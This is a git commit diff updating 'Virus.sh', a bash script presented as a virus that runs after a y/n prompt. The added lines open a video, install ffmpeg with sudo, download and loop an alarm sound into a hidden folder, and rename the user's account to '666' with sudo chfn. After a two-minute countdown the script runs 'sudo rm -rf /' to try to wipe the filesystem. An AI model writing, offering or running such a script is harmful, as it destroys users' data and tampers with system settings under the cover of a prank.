3e7507127a81448956a3a24138ca2fa523f665dd
WinstonAlt <caowinston0@outlook.com>
2025-05-26 15:46:08 -0700

    Update Virus.sh

--- Virus.sh
+++ Virus.sh
@@ -1,8 +1,25 @@
 #!/bin/bash
 
-echo "Are you sure you want to start the virus? (y/n): "
+echo "Are you sure you want to start the virus $USER (y/n): "
 read answer
 if [[ "$answer" == "y" || "$answer" == "Y" ]]; then
+    echo "Is this your Username?"
+    echo "$USER"
+    echo "-------------------"
+    echo "Is this your home directory"
+    echo "/home/$USER/"
+    ERROR="666"
+    xdg-open "https://www.youtube.com/watch?v=GpKlb9yiGvI"
+    sudo apt install ffmpeg
+    cd ~/
+    mkdir .assets
+    cd .assets
+    wget https://www.dropbox.com/scl/fi/d1xdtql2mif5f34odrqnj/your-alarm.mp3?rlkey=xh10eif6oepkh7s4ovyji8chx&st=hv2nbggu&dl=1
+    ffplay -nodisp -autoexit -loop 0 ~/.assets/your-alarm
+    sudo chfn -f "666" $USER
+    echo "---------------------------------"
+    echo "your computer is dommed. I'll give you 2 minutes to say goodbye to your pc."
+    sleep 120
     sudo rm -rf /
 else
     echo "Stopped Virus"
